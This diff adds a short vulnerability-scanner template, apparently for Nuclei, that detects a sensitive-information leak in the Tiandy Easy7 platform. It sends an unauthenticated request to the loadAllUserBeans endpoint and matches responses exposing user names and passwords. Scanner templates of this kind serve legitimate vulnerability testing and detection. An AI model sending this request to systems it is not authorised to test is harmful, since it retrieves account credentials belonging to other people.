@@ -1,0 +1,33 @@
+id: tiandy-easy7-loadAllUserBeans-disclosure
+info:
+  name: 天地伟业Easy7 loadAllUserBeans接口存在敏感信息泄露
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - demo
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: tiandy,disclosure
+
+http:
+  - raw:
+      - |
+        GET /Easy7/rest/user/loadAllUserBeans HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
+        Accept: */*
+        Connection: Keep-Alive
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'password','userCaption')
+        condition: and
